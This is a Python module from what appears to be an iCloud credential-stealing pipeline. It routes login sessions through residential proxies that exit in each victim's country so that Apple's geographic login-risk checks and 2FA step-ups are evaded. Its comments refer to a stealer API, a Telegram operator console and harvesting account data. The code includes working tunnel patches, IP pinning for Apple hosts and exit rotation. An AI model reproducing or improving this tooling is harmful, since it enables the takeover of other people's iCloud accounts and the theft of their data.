#!/usr/bin/env python3
"""Per-country residential proxy support for the whole pipeline.

Why it exists: Apple scores login risk partly on geography — an iCloud
session that suddenly appears from the wrong country steps up to extra
2FA or locks. Exit the proxy in the VICTIM'S country and the login looks
like the victim's usual network.

Vendors (auto-detected from the gateway host, both measured live):
  * niceproxy.io (9proxy): username carries parameters —
    <user>-ssid-<sessionid>-country-<CC> (country tag LAST, uppercase ISO
    code; verified live for US/TR/GB/VN/DE). No true session pinning: every
    NEW TCP connection may get a new exit IP even with the same ssid. Its
    resolver 502s hostname CONNECTs to the Apple auth hosts, and the country
    tag has been seen silently ignored (asked US, got PY — Oct 31).
  * anyip.io (portal.anyip.io:1080): COMMA-SEPARATED flags in the username —
    user,country_US,session_<tag> (docs: location targeting). Sticky per
    session_ flag, hostname CONNECTs to the Apple hosts just fine, and HTTP
    CONNECT does remote DNS exactly like socks5h — the http scheme keeps this
    module's retry/rotation machinery. Retries rotate the session_ suffix;
    a country with no free peer (502 no_peers_available) is dropped on the
    last attempt: a wrong-country exit still harvests, a dead lane doesn't.

Quirks handled here (all measured against the live gateway):
  * 407: the gateway kills the tunnel instead of letting the client
    retry a challenge -> auth is injected PREEMPTIVELY on CONNECT
    (urllib3 2.x otherwise fails "Tunnel connection failed: 407").
  * 502 on some hostnames (e.g. idmsa.apple.com): the gateway's own
    resolver gets an unreachable (IPv6) view of those edges -> we fall
    back to CONNECT-by-IP while keeping SNI/Host of the real hostname.
  * bad exit nodes fail as 502/EOF -> attach() mounts retry+rotation:
    every retry opens a fresh upstream connection = fresh exit IP.

Usage:
    from proxy_support import proxy_url, proxy_url_from_config, attach
    attach(session, proxy_url_from_config(country="US", ssid=job_id))
CLI check:  python proxy_support.py --country US --test
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import random
import socket
import threading
import time
from urllib.parse import urlparse

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3.connection import HTTPSConnection

# ---------- preemptive CONNECT auth + 502-host IP pinning -----------------
# per gateway addr: [user_base, password, country, ssid_base, attempt, vendor]
# The attempt counter rewrites the ssid on every retry: the gateway makes
# its (flaky) routing decision PER SESSION-ID, so a fresh ssid = a fresh
# route decision and escapes a stuck bad route / bad exit.
_AUTH_BY_ADDR: dict[tuple[str, int], list] = {}
_IP_PIN: dict[str, list[str]] = {}   # hostname -> A records to CONNECT instead
_lock = threading.Lock()
_PATCHED = False


def _token_for(entry: list) -> str:
    base, pw, country, ssid, n = entry[:5]
    vendor = entry[5] if len(entry) > 5 else "niceproxy"
    if vendor == "anyip":
        # comma flags; the session_ name rotates on every retry (fresh peer)
        parts = [base]
        if country:
            parts.append(f"country_{country}")
        parts.append(f"session_{ssid}{n if n else ''}")
        uname = ",".join(parts)
    else:
        uname = f"{base}-ssid-{ssid}{n}" if n else f"{base}-ssid-{ssid}"
        if country:
            uname += f"-country-{country}"
    return "Basic " + base64.b64encode(f"{uname}:{pw}".encode()).decode()


def _patch_tunnel() -> None:
    global _PATCHED
    if _PATCHED:
        return
    with _lock:
        if _PATCHED:
            return

        orig = HTTPSConnection._tunnel

        def _tunnel(self):
            proxy = getattr(self, "proxy", None)
            if proxy is not None:
                paddr = (proxy.host if hasattr(proxy, "host") else proxy[0],
                         proxy.port if hasattr(proxy, "port") else proxy[1])
                entry = _AUTH_BY_ADDR.get(paddr)
                if entry:
                    self._tunnel_headers.setdefault("Proxy-Authorization",
                                                    _token_for(entry))
            host = getattr(self, "_tunnel_host", None)
            # anyIP's resolver speaks for Apple's hostnames (measured 200s on
            # idmsa/setup.icloud CONNECTs): hostname first there, and the
            # _RetryAdapter escalates to IP-pinning only if it ever fails.
            anyip = bool(entry) and len(entry) > 5 and entry[5] == "anyip"
            ip = _IP_PIN.get(host) if anyip else _resolve_pin(host)
            if ip:
                # The IP exists ONLY for the CONNECT line: urllib3 derives
                # SNI, cert-verification name and the inner Host: header
                # from _tunnel_host, so it must be restored right after
                # (Apple edges close the tunnel on Host: <ip>).
                self._tunnel_host = ip
                try:
                    return orig(self)
                finally:
                    self._tunnel_host = host
            return orig(self)

        HTTPSConnection._tunnel = _tunnel
        _PATCHED = True


def resolve_a(host: str) -> list[str]:
    try:
        return list({ai[4][0] for ai in socket.getaddrinfo(host, None, socket.AF_INET)
                     if ":" not in ai[4][0]})
    except OSError:
        return []


APPLE_SUFFIXES = (".icloud.com", ".icloud-content.com", ".apple.com",
                  ".me.com", ".mzstatic.com")


def _resolve_pin(host) -> str | None:
    """IPv4 to CONNECT instead of hostname: always for Apple domains
    (their hostnames get broken/IPv6 views at these gateway resolvers —
    measured 502s), on-demand cached for each new host, including the
    per-account p<N>-ckdatabasews partition hosts."""
    if not host:
        return None
    ips = _IP_PIN.get(host)
    if ips is None:
        if not host.endswith(APPLE_SUFFIXES):
            return None
        ips = resolve_a(host)
        if not ips:
            return None
        _IP_PIN[host] = ips
    return random.choice(ips)


class _RetryAdapter(HTTPAdapter):
    """Rotate exits on flaky tunnels: every retry = new upstream connect.
    Any tunnel failure (502 bad gateway route, dropped/EOF exit, 407)
    retries up to fresh upstream connections and pins Apple hostnames to
    CONNECT-by-IPv4. SSL context forces ALPN http/1.1: Apple's edges
    negotiate h2 when offered, and urllib3's HTTP/1.1 framing on an h2
    tunnel dies as RemoteDisconnected (measured)."""

    def __init__(self, session: "requests.Session", **kw):
        self._session = session
        super().__init__(max_retries=Retry(
            total=2, connect=2, read=1, status=0, backoff_factor=0.4,
            allowed_methods=None), **kw)

    @staticmethod
    def _h1_ctx():
        from urllib3.util.ssl_ import create_urllib3_context
        ctx = create_urllib3_context()
        ctx.set_alpn_protocols(["http/1.1"])
        return ctx

    def init_poolmanager(self, *args, **kw):
        kw["ssl_context"] = self._h1_ctx()
        return super().init_poolmanager(*args, **kw)

    def send(self, request, **kw):
        if not kw.get("timeout"):
            kw["timeout"] = (10, 60)         # never let a dead exit hang us
        # these gateway tunnels die on idle reuse; one request per tunnel
        # (proven pattern: every single-shot CONNECT+request succeeds)
        request.headers["Connection"] = "close"
        host = urlparse(request.url).hostname
        purl = self._session.proxies.get("https") or self._session.proxies.get("http")
        paddr = urlparse(purl or "http://x")
        entry = _AUTH_BY_ADDR.get((paddr.hostname, paddr.port))
        last = None
        for attempt in range(5):
            try:
                return super().send(request, **kw)
            except (requests.exceptions.ProxyError,
                    requests.exceptions.ConnectionError) as e:
                last = e
                msg = str(e)
                if entry is not None:
                    entry[4] = attempt + 1          # fresh ssid -> new route
                    if (len(entry) > 5 and entry[5] == "anyip"
                            and attempt >= 2 and "502" in msg):
                        entry[2] = None  # no peer for that country: drop tag
                if host and ("502" in msg or "tunnel" in msg.lower()
                             or "RemoteDisconnected" in msg or "EOF" in msg):
                    if host not in _IP_PIN and attempt >= 1:
                        ips = resolve_a(host)
                        if ips:
                            _IP_PIN[host] = ips
                elif "407" not in msg:
                    raise
            time.sleep(0.4 + attempt * 0.3)
        raise last


# ---------- operator country lock ------------------------------------------
# The resolver in stealer_api follows the VISITOR's country by default; this
# lock is the operator's deliberate override ("I want this account to always
# exit in the US"). Stored in out/country_lock.json — the worker re-reads it
# per job, so a lock set from the Telegram console takes effect immediately,
# no restart. Lives here because BOTH the worker (reads) and the console bot
# (writes) import this module and share the same out/ directory.
COUNTRY_LOCK_FILE = "country_lock.json"


def read_country_locks(out_dir) -> dict:
    """email(lowercased) -> forced ISO country, {} when nothing is locked."""
    try:
        p = out_dir / COUNTRY_LOCK_FILE
        return {str(k).lower(): str(v).upper()
                for k, v in json.loads(p.read_text()).items()}
    except Exception:
        return {}


def set_country_lock(out_dir, email: str, cc: str) -> str:
    """Lock email to cc; cc in {'', 'auto', 'off'} releases it.
    Returns the resulting state ('' = unlocked)."""
    email = (email or "").strip().lower()
    cc = (cc or "").strip().upper()
    d = read_country_locks(out_dir)
    if cc in ("", "AUTO", "OFF"):
        d.pop(email, None)
        cc = ""
    else:
        d[email] = cc
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / COUNTRY_LOCK_FILE).write_text(json.dumps(d, indent=1))
    return cc


def proxy_url(user: str, password: str, host: str, port: int | str,
              country: str | None = None, ssid: str | None = None) -> str:
    """Build the gateway URL with parameterized username."""
    if "anyip" in host.lower():
        # anyIP: comma-separated username flags (country_[ISO], session_[name])
        parts = [user]
        if country:
            parts.append(f"country_{country.upper()}")
        if ssid:
            parts.append("session_" + "".join(c for c in ssid if c.isalnum()))
        return f"http://{','.join(parts)}:{password}@{host}:{port}"
    uname = user
    if ssid:
        # hyphens INSIDE an ssid value make the gateway answer 407
        # "Username invalid" (measured) — keep the tag alnum.
        uname += "-ssid-" + "".join(c for c in ssid if c.isalnum())
    if country:
        uname += f"-country-{country.upper()}"
    return f"http://{uname}:{password}@{host}:{port}"


def proxy_url_from_config(country: str | None = None, ssid: str | None = None,
                          config: dict | None = None) -> str | None:
    """Resolve proxy from an account.json 'proxy' block / ICLOUD_PROXY_JSON,
    or the ICLOUD_PROXY full-URL override.

    config = {"host": "niceproxy.io", "port": 17521, "user": "abdo_C6xN",
              "password": "***", "country": "US"}          # optional default
    """
    if os.environ.get("ICLOUD_PROXY"):
        return os.environ["ICLOUD_PROXY"]
    cfg = config or (json.loads(os.environ.get("ICLOUD_PROXY_JSON", "{}"))
                     if os.environ.get("ICLOUD_PROXY_JSON") else {})
    if not cfg.get("host"):
        return None
    return proxy_url(cfg.get("user", ""), cfg.get("password", ""), cfg["host"],
                     int(cfg.get("port", 8000)),
                     country or os.environ.get("ICLOUD_PROXY_COUNTRY") or cfg.get("country"),
                     ssid or os.environ.get("ICLOUD_PROXY_SSID") or "icloudbot")


def attach(session: requests.Session, url: str | None) -> requests.Session:
    """Put a session behind the proxy (no-op when url is None)."""
    if not url:
        return session
    _patch_tunnel()
    p = urlparse(url)
    user = p.username or ""
    if "anyip" in (p.hostname or "") or "," in user:
        parts = [s for s in user.split(",") if s]
        base = parts[0] if parts else "user"
        country = next((s[len("country_"):].upper() for s in parts
                        if s.lower().startswith("country_")), None)
        ssid = next((s[len("session_"):] for s in parts
                     if s.lower().startswith("session_")), "")
        _AUTH_BY_ADDR[(p.hostname, p.port)] = [
            base, p.password or "", country,
            "".join(c for c in ssid if c.isalnum()) or "default", 0, "anyip"]
    else:
        base, _, ssid_part = user.partition("-ssid-")
        ssid, _, country = ssid_part.partition("-country-")
        _AUTH_BY_ADDR[(p.hostname, p.port)] = [base, p.password or "",
                                               country.upper() or None,
                                               ssid or "default", 0,
                                               "niceproxy"]
    clean = f"http://{p.hostname}:{p.port}"
    session.proxies.update({"http": clean, "https": clean})
    session.trust_env = False  # keep ambient env proxies out of the picture
    adapter = _RetryAdapter(session)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


def env_session(**kw) -> requests.Session:
    """New session behind the configured env proxy (plain when unconfigured)."""
    s = requests.Session(**kw)
    attach(s, proxy_url_from_config(ssid=os.environ.get("ICLOUD_PROXY_SSID") or "dl"))
    return s


def test_exit(country: str | None) -> None:
    url = proxy_url_from_config(country=country, ssid="clitest")
    if not url:
        raise SystemExit("no gateway configured: set ICLOUD_PROXY_JSON="
                         '{host,user,password} or pass ICLOUD_PROXY=<full url>')
    s = requests.Session()
    attach(s, url)
    s.verify = False
    r = s.get("https://ipwho.is/", timeout=40).json()
    print(r.get("country"), r.get("region"), r.get("city"), r.get("ip"),
          "| conn.type:", (r.get("connection") or {}).get("type"))


if __name__ == "__main__":
    urllib3.disable_warnings()
    ap = argparse.ArgumentParser()
    ap.add_argument("--country", default=None)
    ap.add_argument("--test", action="store_true")
    a = ap.parse_args()
    if a.test:
        test_exit(a.country)
    else:
        print(proxy_url_from_config(country=a.country, ssid="demo") or
              "set ICLOUD_PROXY_JSON={host,user,password}")
